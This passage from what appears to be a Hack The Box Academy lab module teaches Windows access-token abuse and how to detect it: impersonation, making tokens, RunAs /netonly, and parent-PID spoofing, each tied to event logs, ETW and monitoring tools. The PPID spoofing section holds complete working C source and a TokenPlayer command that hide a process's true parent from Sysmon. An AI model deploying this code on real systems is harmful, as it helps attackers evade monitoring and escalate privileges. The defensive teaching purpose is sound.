More details can be found on the Microsoft documentation [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels).

## Token Impersonation Scenario

To demonstrate token impersonation, we have a custom program that calls the [LogonUserW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw) function, which returns the token for the supplied user credentials, duplicates the token using the [DuplicateTokenEx()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex) function, impersonates the user's security context by using [ImpersonateLoggedOnUser()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser), prints the username during impersonation, and then reverts back to the original caller using [RevertToSelf()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself).

![Impersonate](https://academy.hackthebox.com/storage/modules/256/impersonate2-1.png)

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools and samples at the following paths:

- **Token Impersonation**: `C:\Tools\impersonate.exe`
- **x64dbg**: `C:\Tools\x64dbg\release\x64\x64dbg.exe`

* * *

When we run the custom program, it prompts for a username, domain, and password. Enter the credentials as specified in the screenshot below. These credentials are used to log in the user by using the function `LogonUserW`, which is used to log in the user with the provided credentials. It returns a handle to the user's token if successful. Once the user is logged in, their token is duplicated using `DuplicateTokenEx` to create an impersonation token. This token can be used to impersonate the logged-on user. The impersonation token is used to impersonate the logged-on user's security context by using the `ImpersonateLoggedOnUser` function.

![LogonUser](https://academy.hackthebox.com/storage/modules/256/imptk1.png)

After entering all details, press ENTER. It shows the output for the user running before the `ImpersonateLoggedOnUser()` function was called and after the function is called. At this point, the thread is executing as `impersonate.user`. If we press ENTER again, it uses the `RevertToSelf()` function to revert the token to normal.user.

While the thread is running with an impersonation token (i.e., context of impersonate.user), we can run the PowerShell command `Show-NtToken -All` to open the Token Viewer UI to verify this. Open the Threads tab and look for `impersonate.exe`. This shows the thread is running in the `impersonate.user` security context.

![LogonUser](https://academy.hackthebox.com/storage/modules/256/imptk2.png)

At the same time, open the Processes tab and look for `impersonate.exe`. This shows that the process is still running in the `normal.user` security context.

![LogonUser](https://academy.hackthebox.com/storage/modules/256/imptk3.png)

This confirms that the impersonation occurs only within the thread making the impersonation request, while the process retains its primary token.

There is also a WINAPI function [SetThreadToken()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadtoken), where we can pass the impersonation token duplicated using `DuplicateTokenEx` and assign it to a specific thread ID.

![SetThreadToken](https://academy.hackthebox.com/storage/modules/256/setthread2.png)

## Detection Opportunities

When the `LogonUserW` function is called, security event ID 4624 is generated, which provides information about the source and target user, the type of logon (e.g., interactive, network), and other details about the logon session. This event is useful for monitoring and auditing purposes to track user logon activity on a system.

![eid 4624](https://academy.hackthebox.com/storage/modules/256/imptk4.png)

There is also a security Event ID `4648`: A logon was attempted using explicit credentials.

![eid 4648](https://academy.hackthebox.com/storage/modules/256/imptk5.png)

And, when the token is reverted back, the security Event ID `4634` (An account was logged off) is generated.

![eid 4624](https://academy.hackthebox.com/storage/modules/256/imptk6.png)

### Detection using JonMon

[JonMon](https://github.com/jsecurity101/JonMon) contains open-source telemetry sensors designed to provide users with visibility into the operations and activity of their Windows systems. JonMon has a kernel-level driver component, which is designed to collect information related to system operations such as process creation, registry operations, file creates and more.

When we perform impersonation, the details of a thread that is impersonating can be captured using JonMon. JonMon has a survey-based detection mechanism that surveys processes that have an impersonation thread.

While the impersonation program is running, we can go to Event Viewer > Application and Services Logs > JonMon/Operational. Filter for event ID 31 i.e. ThreadTokenImpersonation Event.

![](https://academy.hackthebox.com/storage/modules/256/tokenimpersonate31.png)

* * *

API monitoring can also be helpful in detecting token impersonation by monitoring the sequence and frequency of Windows API functions called during a process's execution. Monitoring certain sequences or combinations of API calls could be indicative of such activity. For example, when a process attempts to manipulate tokens to impersonate another user, it may call functions like `OpenProcessToken()` or `LogonUserW()`, `DuplicateTokenEx()`, `SetThreadToken()`, or `ImpersonateLoggedOnUser()`. Monitoring these functions and their parameters, especially in conjunction with other actions like privilege modifications or process creation, can help identify suspicious behavior indicative of token impersonation.

To understand API Monitoring, we can use API Monitor which is already installed in the target (VM).

We can select the list of API functions to monitor (for example - LogonUserW,OpenProcessToken,ImpersonateLoggedOnUser,RevertToSelf) and start the new process.

![](https://academy.hackthebox.com/storage/modules/256/api-monitor-imp.png)

This opens up the console to enter the details. Once details are entered, we can view the monitored API functions and their parameters.

![](https://academy.hackthebox.com/storage/modules/256/api-mon-imp.png)

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Make Access Tokens

Attackers may generate new tokens to impersonate users, thus escalating privileges and evading access controls. For example, if an attacker has acquired a username and password, but the corresponding user is not currently logged in, the attacker can create a logon session for that user using the [LogonUser()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera) function or create another process under the context of the target user using functions such as [CreateProcessWithLogonW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw).

![maketoken](https://academy.hackthebox.com/storage/modules/256/maketoken_.png)

Let's try to understand how the built-in utility [RunAs.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) creates a new process with the supplied credentials.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools and samples at the following paths:

- **Strings**: `C:\Tools\SysinternalsSuite\strings64.exe`
- **x64dbg**: `C:\Tools\x64dbg\release\x64\x64dbg.exe`
- **RunAs**: `C:\Windows\System32\runas.exe`
- **Tokenvator**: `C:\Tools\Tokenvator.exe`

* * *

If we perform a basic string check on `RunAs.exe`, it shows the presence of the `CreateProcessWithLogonW` function.

```cmd-session
C:\Tools\SysinternalsSuite\strings64.exe C:\Windows\System32\runas.exe

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
#:$
RichF\
.text
`.rdata
@.data
.pdata
@.rsrc
@.reloc
xKH
t&L+
UWATAVAWH
l$0H
]`H
uhH
\$0
}XL
ePD
D$(
\$ E3
D$(
\$ E3
tTH
tDA
OH;
]`H
uhH
e A_A^A\_]
H WH
P 3
|$x
u{H
tdH

...SNIP...

CredMarshalCredentialW
CredGetSessionTypes
SaferGetPolicyInformation
SaferCloseLevel
CreateProcessWithLogonW
CredWriteW
ADVAPI32.dll
lstrlenW
GetVersionExW
lstrcmpiW
HeapFree
SetLastError
GetCommandLineW

...SNIP...

```

At the bottom of the above output, we can see the function name `CreateProcessWithLogonW` in the list of strings. To reverse that, we can start `RunAs.exe` inside the `x64dbg.exe` debugger and add the command line with the `/user` flag and the name of the process to create (for example, cmd.exe) using the given credentials.

First, launch x64dbg from the `C:\Tools\x64dbg\release\x64\x64dbg.exe` location. Click on File > Open. Navigate to `C:\Windows\System32\` and select `runas.exe`.

Go to File > Change Command Line. Use the following command line to specify the user and action:

```cmd-session
"C:\Windows\System32\runas.exe" /user:legacy\admin.user cmd.exe

```

![Runas](https://academy.hackthebox.com/storage/modules/256/runas2.png)

Click OK to load the executable with the specified arguments. Click on the `Restart` button in x64dbg to make sure that the debugging start with the command-line. Once the binary is loaded in x64dbg, set breakpoints to monitor specific functions:

```cmd-session
bp CreateProcessWithLogonW
bp ExitProcess

```

![breakpoint](https://academy.hackthebox.com/storage/modules/256/breakpoint.png)

After we add a breakpoint on the function `CreateProcessWithLogonW`, click on the Run button to start debugging, and click it once more. Go to the command prompt to enter the password for the `admin.user` (i.e., `password@123`) in RunAs.exe, and press Enter. We should reach the breakpoint for the function call. Notice that the RunAs.exe tool calls the `CreateProcessWithLogonW` function with the `R9` register ( `dwLogonFlags`) having value `0x01`.

![Runas](https://academy.hackthebox.com/storage/modules/256/runas3.png)

When debugging in x64dbg, it's important to understand the Windows x64 calling convention, as it defines how arguments are passed to functions and how results are returned.

The first four arguments are passed as follows:

- `RCX`: Holds the first argument.
- `RDX`: Holds the second argument.
- `R8`: Holds the third argument.
- `R9`: Holds the fourth argument.

Additional arguments are passed on the stack in right-to-left order and the function's return value is stored in the `RAX` register.

The syntax for the `CreateProcessWithLogonW()` function is as follows:

```C
BOOL CreateProcessWithLogonW(
  [in]                LPCWSTR               lpUsername,
  [in, optional]      LPCWSTR               lpDomain,
  [in]                LPCWSTR               lpPassword,
  [in]                DWORD                 dwLogonFlags,
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);

```

In the documentation of the `CreateProcessWithLogonW` function, the 4th parameter is `dwLogonFlags`, which can contain the values `0x01` or `0x02`.

![dwLogonFlags](https://academy.hackthebox.com/storage/modules/256/dwlogonflags.png)

The value of `0x01` used by RunAs.exe refers to `LOGON_WITH_PROFILE`, which indicates that the user's profile should be loaded into the `HKEY_USERS` registry key during the logon process. The function will return after the user profile has been loaded, allowing the newly created process to access information stored in the user's registry hive.

### Make token without spawing new process

Another function is `LogonUserA`, which closely resembles `CreateProcessWithLogonW`, but without the process creation functionality. LogonUserA's primary role is to establish a new security context based on provided credentials. This function is also utilized by Cobalt Strike's [make\_token](https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials) command and is frequently paired with the `LOGON32_LOGON_NEW_CREDENTIALS` logon type to establish a NETONLY security context, a technique often observed in some open-source C2 framework implementations as well.

Below is the syntax for the LogonUserW function:

```C
BOOL LogonUserW(
  [in]           LPCWSTR lpszUsername,
  [in, optional] LPCWSTR lpszDomain,
  [in, optional] LPCWSTR lpszPassword,
  [in]           DWORD   dwLogonType,
  [in]           DWORD   dwLogonProvider,
  [out]          PHANDLE phToken
);

```

![Make token](https://academy.hackthebox.com/storage/modules/256/maketoken1.png)

The `LogonUser` function creates a new logon session for a specified user. It takes parameters such as the username, domain, password, and the type of logon to perform, which is specified by `dwLogonType`. When a user physically logs into their workstation, the logon type would be `LOGON32_LOGON_INTERACTIVE`. For a network logon, (where the logon type is `LOGON32_LOGON_NETWORK`), an impersonation token is returned, typically used by a server to work on behalf of a remote client.

The table below shows the possible values for the `dwLogonType` parameter.

![dwLogonType](https://academy.hackthebox.com/storage/modules/256/dwlogontype.png)

If the function succeeds, it returns a handle to the new session's access token that represents the user whose credentials were supplied. This token handle can then be assigned to a thread using `SetThreadToken` or used to create a new process using `CreateProcessWithTokenW`, as discussed earlier. This tactic differs from token impersonation or theft, as it involves creating a new user token from the stolen credentials rather than stealing or duplicating an existing one.

Attackers often use the ImpersonateLoggedOnUser function to allow the calling thread to impersonate a logged-on user's security context by passing the handle to the token. The screenshot from MITRE below shows references for some known malicious software that have used such techniques.

![ImpersonateLoggedOnUser](https://academy.hackthebox.com/storage/modules/256/mitre.png)

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Network Authentication

When a user logs in, a new interactive logon session is created on the local system, and the credentials are cached automatically for interactive logons as part of Windows SSO. When accessing resources on a remote computer, the concept of network logons comes into play, as local logon tokens cannot be directly used across machines.

![Network](https://academy.hackthebox.com/storage/modules/256/localauth-.png)

In case a user needs to access a resource over the network, a new network logon session is established on the remote host because sending the access token from the current local host over the network is not secure. Instead, the user must re-authenticate and create a new logon session on the remote machine, provided they have the necessary access rights.

Windows automatically stores credentials for interactive logons as part of its single sign-on mechanism, eliminating the need for users to repeatedly enter their passwords when accessing network resources. This allows access tokens associated with these logon sessions to authenticate to remote hosts, with Windows managing authentication automatically whenever a network resource is accessed.

![Network](https://academy.hackthebox.com/storage/modules/256/netwauth-.png)

Let's try to perform a basic network authentication and access some network resources.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools and samples at the following paths:

- **Logonsessions**: `C:\Tools\SysinternalsSuite\logonsessions64.exe`
- **x64dbg**: `C:\Tools\x64dbg\release\x64\x64dbg.exe`

* * *

For example, if we use `net view` command on `\\DC01`, we can see the list of network shares. The screenshot below shows the user account (normal.user) trying to access network shares on the remote host `DC01` over the network. Then we try to list the `C$` share, which refers to C: drive on DC01.

![Network](https://academy.hackthebox.com/storage/modules/256/network1_.png)

As this is a network activity, the authentication of the client over the network is typically performed using Kerberos or NTLM in Windows domains, resulting in the establishment of a new network logon session for the user. We can verify this using the [LogonSessions](https://learn.microsoft.com/en-us/sysinternals/downloads/logonsessions) utility on the remote host ( `DC01` in this case).

![Network](https://academy.hackthebox.com/storage/modules/256/network2_.png)

Upon successful authentication of the remote user, the server receives a newly generated access token representing the network logon of the remote client. When this happens on the remote host, several events may be generated in the Windows Security event log. Event 4769 is logged when a Kerberos service ticket is requested. We can see the source client IP in the network information in this event.

![EID 4769](https://academy.hackthebox.com/storage/modules/256/eid4769_.png)

Event 4624 is logged when the user successfully logs on to the system with the logon type 3, indicating the network logon. This event also contains the username of the user who accessed the public share and the IP address of the source client from where the share was accessed.

![Network EID 4624](https://academy.hackthebox.com/storage/modules/256/eid4624net_.png)

Security Event ID 5156 is part of the Windows Filtering Platform (WFP) logs. This event indicates that a connection was permitted by the Windows Firewall for port 445, which is the SMB (Server Message Block) port used for file sharing and administrative shares like C$. Additionally, Security Event ID 5140 is logged for network share object access. These events are shown as follows:

![Network EID 4624](https://academy.hackthebox.com/storage/modules/256/event-filefw.png)

These events indicate that a user successfully authenticated to the domain controller to access the public shares and then successfully logged on to the system using their own credentials. This is a typical sequence of events when accessing network resources in a Windows environment.

## The NETONLY flag

The netonly flag in the `RunAs` utility is used to run a program using the credentials of a specified user account, but only for network connections. When we use `RunAs /netonly`, Windows will authenticate the user for network access only and will not create a new process with the specified user's credentials for local access.

![Netonly](https://academy.hackthebox.com/storage/modules/256/netonly.png)

This means that any connections to network resources, such as accessing shared folders or connecting to network services, will use the specified user's credentials, but interactions with the local system (e.g., running programs locally) will continue to use the current user's credentials.

In the following screenshot, we can see that the local user `normal.user` doesn't have permission to list the `C$` share on the network host `DC01`. Then, RunAs is used with `/NETONLY` flag to run powershell.exe as the user `admin.user` (password is `password@123`), who has access to `C$` on the remote host `DC01`.

![Netonly](https://academy.hackthebox.com/storage/modules/256/netonlyintro-1.png)

On the spawned `powershell.exe`, we can see that it still shows the user as `normal.user` locally, but it is able to access and list the `C$` share on the `DC01` over the network.

![Netonly](https://academy.hackthebox.com/storage/modules/256/netonlyintro1.png)

#### LOGON\_NETCREDENTIALS\_ONLY

When the RunAs utility is started with the NETONLY flag, it passes the value 0x02, which refers to `LOGON_NETCREDENTIALS_ONLY`. When this value is passed to the CreateProcessWithLogonW function, it allows you to log on using specified credentials only for network access. This means that while the new process uses the same token as the caller locally, it creates a new logon session within the Local Security Authority (LSA) and uses the specified credentials as the default credentials for network operations.

![NETONLY](https://academy.hackthebox.com/storage/modules/256/netonly1.png)

It's important to note that the system does not validate the specified credentials, so the process may start even if the credentials are incorrect. However, this could result in the process not having access to network resources if the credentials are invalid or insufficient.

To demonstrate this, we have supplied the credentials of `admin.user` to the RunAs utility to run the `cmd.exe` process. The user admin.user has the access to the file system on the domain controller, whereas the user normal.user doesn't seem to have admin access to the domain controller. When the user normal.user tries to access `C$` share on the domain controller, it gets access denied error. Then, we have the `cmd.exe` started through the `RunAs.exe` utility, which is running under the network-only credentials of admin.user. When this user tries to access the `C$` share on the domain controller, it passes the check and is able to list the files on the `C$` share.

![NETONLY](https://academy.hackthebox.com/storage/modules/256/netonly2.png)

When the new credentials are supplied and cached, we can use the logon sessions tool from SysInternals to check if there is a new logon session. Logon sessions created with the NewCredentials flag can be easily identified by the Logon type field that creates `NewCredentials` value.

![NETONLY](https://academy.hackthebox.com/storage/modules/256/netonly3.png)

Below, the diagram shows the normal flow that occurs when RunAs is used with the NETONLY flag. During this process, a new logon session is created with the logon type `NewCredentials`. This will be used for all network connections initiated. The specified user's credentials are used to re-authenticate over the network, but locally it will continue to run with the user's current permissions on the local computer.

![NETONLY](https://academy.hackthebox.com/storage/modules/256/netonlyflow-.png)

For this kind of activity, there are some interesting artifacts in the Windows event logs under the Event ID 4624, containing the information about the source account that reported information about successful logon, the subject's domain or computer name, type of logon that occurred (logon type is 9 in this case), the name and domain of the account for which logon was performed.

![NETONLY](https://academy.hackthebox.com/storage/modules/256/netonly4_.png)

Note: Logon ID value can help in correlating this event with other events that might contain the same Logon ID.


The explanation of logon type 9 from Microsoft documentation states that the caller duplicated its current token and provided new credentials for outbound network connections. However, the new logon session keeps the same local identity but uses different credentials for other network connections.

![NETONLY](https://academy.hackthebox.com/storage/modules/256/netonly5.png)

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# PPID Spoofing using Access Token

Parent PID Spoofing is a technique (MITRE ID: [T1134.004](https://attack.mitre.org/techniques/T1134/004/)) used by attackers or malware to attempt to evade detection and conceal their activities by spoofing or impersonating the process ID (PID) of a legitimate parent process. This technique is often employed to make the malicious process appear as if it was launched by a trusted system process, making it more difficult to distinguish from legitimate processes.

![PPID-Spoof](https://academy.hackthebox.com/storage/modules/256/mitreppid.png)

## PPID Spoofing using Access Tokens

It is possible to create a process with a specific token using the Windows APIs (such as `CreateProcessAsUserA`), which have the option to pass a token handle while creating a new process. Usually, the `CreateProcess` function creates a new process with the same access token as the creating process. It is typically used to create a child process that inherits the security context of the parent process. But in case of functions like `CreateProcessAsUserA`, a new process can be created with the security context of a specified user. It requires a token handle representing the target user's access token.

The attacker starts by using the `OpenProcess` function to obtain a handle to a legitimate process that they want to impersonate or spoof as the parent process. Next, the attacker calls `OpenProcessToken` to open the access token associated with the legitimate process. This access token contains security information, including the user account details and privileges. Finally, the attacker uses the `CreateProcessAsUserA` function to create a new process, specifying the impersonated access token obtained in the previous step. This creates a malicious process that appears to be a child of the spoofed legitimate parent process, inheriting its security context and potentially evading detection or gaining elevated privileges.

![PPID-Spoof](https://academy.hackthebox.com/storage/modules/256/ppid-spoof_.png)

Let's understand this using a custom program that uses the `OpenProcess()`, `OpenProcessToken()`, and `CreateProcessAsUserA()` functions to perform PPID spoofing. Normally, the `OpenProcess` function is used to open the handle of a target process. Then, the `OpenProcessToken` function is used to open the access token associated with the process.

```c
DWORD dwProcessId = atoi(argv[1]);

// Get the handle of the parent process
HANDLE parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
if (!parentProcessHandle)
{
  printf("Failed to open parent process\n");
  return 1;
}

HANDLE hToken;
if (!OpenProcessToken(parentProcessHandle, TOKEN_ALL_ACCESS, &hToken))
{
  printf("Failed to open process token\n");
  CloseHandle(parentProcessHandle);
  return 1;
}

```

Then, the `STARTUPINFOEXA` structure is initialized, and a list of process thread attributes can be configured. Functions like `InitializeProcThreadAttributeList` and `UpdateProcThreadAttribute` can set the parent process attribute of the new process to any desired value. These attributes include information about the parent process to be used when creating a new process.

```c
STARTUPINFOEXA si;
PROCESS_INFORMATION pi;
SIZE_T attributeSize;
ZeroMemory(&si, sizeof(STARTUPINFOEXA));

InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

```

The `InitializeProcThreadAttributeList` function initializes a list of attributes for process and thread creation. It prepares a list that can be used to specify extended attributes for the process or thread being created.

The `UpdateProcThreadAttribute` function updates a specified attribute in a process or thread attribute list. It allows for the modification of attributes in the list before the process or thread is created.

![ppid_update](https://academy.hackthebox.com/storage/modules/256/ppid_update.png)

The third parameter is the `attribute` key to update in the attribute list. This can set the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` flag, which allows the user to specify the parent process of the thread.

![ppid_update](https://academy.hackthebox.com/storage/modules/256/ppid_update1.png)

These functions are used together to customize the behavior of the process or thread being created by specifying additional attributes beyond the default settings. Then, the `CreateProcessAsUserA()` function is called with the `EXTENDED_STARTUPINFO_PRESENT` flag that creates a new process, `mspaint.exe`.

```c
// Use the token of the parent process
if (!CreateProcessAsUserA(hToken, NULL, (LPSTR)"mspaint.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
{
  printf("Failed to create process as user\n");
  CloseHandle(parentProcessHandle);
  CloseHandle(hToken);
  return 1;
}

```

When this activity happens, the process creation events don't show the real parent. This appears normal in the process creation events.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools and samples at the following paths:

- **Process Hacker**: `C:\Tools\ProcessHacker\ProcessHacker.exe`
- **Real Parent**: `C:\Tools\real_parent.exe`
- **Token Player**: `C:\Tools\TokenPlayer.exe`

* * *

The output below shows how PPID spoofing can be performed using [TokenPlayer](https://github.com/S1ckB0y1337/TokenPlayer).

```cmd-session
C:\> C:\Tools\TokenPlayer.exe --spoofppid --ppid 4260 --prog C:\Windows\system32\cmd.exe

[+]Target PID: 4260
[+]OpenProcess() succeed!
[*]Initializing Process Attributes
[*]Spawning Process with Spoofed Parent
[+]Proccess spawned with PID: 2648

```

We can also run the PPID spoofing sample executable from the location `C:\Tools\real_parent.exe` to simulate this attack. This will spoof the parent PID as the specified one and create a child process as `mspaint.exe`.

![Event 4688](https://academy.hackthebox.com/storage/modules/256/ppid_event_.png)

If we check the event logs, even Sysmon misses the real parent process and shows the spoofed parent.

![sysmon eid1](https://academy.hackthebox.com/storage/modules/256/nosysmon_.png)

In the next section, we'll go through the detections for the PPID spoofing technique.

## Source Code used for PPID spoofing sample

The C program below takes a PID from the user, which will be used as a spoofed parent.

```C
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <Spoofed parent PID>\n", argv[0]);
        return 1;
    }

    DWORD dwProcessId = atoi(argv[1]);

    // Get the handle of the parent process
    HANDLE parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!parentProcessHandle)
    {
        printf("Failed to open parent process\n");
        return 1;
    }

    HANDLE hToken;
    if (!OpenProcessToken(parentProcessHandle, TOKEN_ALL_ACCESS, &hToken))
    {
        printf("Failed to open process token\n");
        CloseHandle(parentProcessHandle);
        return 1;
    }

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Use the token of the parent process
    if (!CreateProcessAsUserA(hToken, NULL, (LPSTR)"mspaint.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
    {
        printf("Failed to create process as user\n");
        CloseHandle(parentProcessHandle);
        CloseHandle(hToken);
        return 1;
    }

    CloseHandle(parentProcessHandle);
    CloseHandle(hToken);
    printf("spoofing done\n");
    getchar();
    return 0;
}

```

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Detections Opportunities

PPID spoofing is not captured in normal process creation event logs or usual process monitoring tools, including Task Manager, Process Hacker, Sysmon, etc. However, there are a few ways to detect this activity, such as telemetry from ETW, call stack analysis, or using a kernel driver. Let's explore these in detail to understand the detections.

## Detection using ETW

To demonstrate this activity, we simulated this attack using the custom program mentioned in the previous section, i.e., `real_parent.exe`, which uses the `CreateProcessAsUserA` function to create a new process. This program creates a child process, `mspaint.exe` (with the PID 3080) and the spoofed parent is `explorer.exe` (with the PID 776).

Once we run this program, a new process, `mspaint.exe`, is spawned by `explorer.exe`. We can perform ETW tracing and detect this activity by utilizing the `Microsoft-Windows-Kernel-Process` provider on the target (VM). This provider offers insights into processes started and terminated on the system.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools and samples at the following paths:

- **Real Parent**: `C:\Tools\real_parent.exe`
- **Process Hacker**: `C:\Tools\ProcessHacker\ProcessHacker.exe`
- **Process Monitor**: `C:\Tools\SysinternalsSuite\Procmon64.exe`
- **API Monitor**: `C:\Tools\API Monitor\apimonitor-x64.exe`
- **Full EventLog View**: `C:\Tools\fulleventlogview\FullEventLogView.exe`

* * *

To begin, navigate to a directory such as `C:\Tools`. Create a trace session by subscribing to process-related events using the following commands:

```cmd-session
C:\> logman create trace spoofing-trace -p Microsoft-Windows-Kernel-Process 0x10 -ets

```

This command creates a new trace session named "spoofing-trace" (we can name it anything) and specifies that it should capture events from the `Microsoft-Windows-Kernel-Process` provider with the `0x10` keyword (which corresponds to process-related events). The `-ets` flag specifies that this is an Event Trace Session. This should automatically create and start the ETW trace session. If the trace doesn't start, we can start it using the command mentioned below:

```cmd-session
C:\> logman start spoofing-trace -ets

```

This command starts (if not already started) the trace session named "spoofing-trace" that was previously created. It initiates the capturing of events related to the `Microsoft-Windows-Kernel-Process` provider with the specified keyword.

Once the trace is started, we can perform the simulation by running the program that spoofs the parent process ID.

![ETW 1](https://academy.hackthebox.com/storage/modules/256/etw1_.png)

When we look at the process creation event logs, we see the details of the new process and the parent process.

![EID 4688](https://academy.hackthebox.com/storage/modules/256/eid4688_.png)

In this scenario, we can see that the process `mspaint.exe` is created by `explorer.exe`. However, this is the spoofed parent process; the actual parent process is `real_parent.exe` with the PID 5164. This information is missed by the normal event logs.

However, this information can be tracked in the ETW telemetry under the "Execution Process ID" field in the `Microsoft-Windows-Kernel-Process` provider.

First, let's stop the running trace session.

```cmd-session
C:\> logman stop spoofing-trace -ets

```

Now, we can go to the Event Viewer and right-click on "Saved Logs" to open the trace file `spoofing-trace.etl`. Browse to the location where the `.etl` file is saved, such as " `C:\Tools\spoofing-trace.etl`".

![ETW4](https://academy.hackthebox.com/storage/modules/256/etw3_.png)

After opening the trace file, the events will be shown in the Event Viewer.

![ETW4](https://academy.hackthebox.com/storage/modules/256/etw4_.png)

Open the event with the Event ID for the new `mspaint.exe` process.

![ETW5](https://academy.hackthebox.com/storage/modules/256/etw5_.png)

When analyzing the event data, focus on:

- `ProcessID`: The PID of the new process.
- `ParentProcessID`: The PID of the parent process.
- `Execution ProcessID`: Describes the actual creator process ID.

The field that identifies the actual creator process executing the event is `Execution ProcessID`. We can cross-reference the `ParentProcessID` with the creator parent process in the system. Here, the `ParentProcessID` does not match the expected creator PID mentioned in the `Execution ProcessID`, which indicates a possibility of PPID spoofing.

## Detecting PPID Spoofing using ProcMonX2

[ProcMonX2](https://github.com/zodiacon/ProcMonXv2) also tracks the creator process ID by using Event Tracing for Windows (ETW) instead of a kernel driver to provide event information. In the screenshot below, we can see that `mspaint.exe` was created by `real_parent.exe`. It doesn't show any involvement of a spoofed parent.

![ProcMonX2](https://academy.hackthebox.com/storage/modules/256/procmonx2_.png)

## Detecting PPID Spoofing in Call Stack

To monitor the activities that take place when we run the PPID spoofing program, we can start by setting up Process Monitor and API Monitor to check the operations and call stack.

To get a summary of the call stack for the spoofed parent (i.e., `mmc.exe` in this case), we can add a filter on the " `Process Create`" operation in Process Monitor. When the child process `mspaint.exe` is created, we should see an event under "Process Create" operation, such as the one shown in the screenshot below.

![Proc Mon](https://academy.hackthebox.com/storage/modules/256/procmon.png)

On the other side, we can also start monitoring the original parent (i.e., `real_parent.exe`) in the API Monitor to check its call stack.

![API Monitor](https://academy.hackthebox.com/storage/modules/256/apimon03.png)

When the child process is created, an event is generated in the Process Monitor. We can double-click the event to open the event properties so that we can see the call stack for `mmc.exe` (the spoofed parent). Surprisingly, we see a few frames (highlighted) in mmc.exe's call stack from an unknown module.

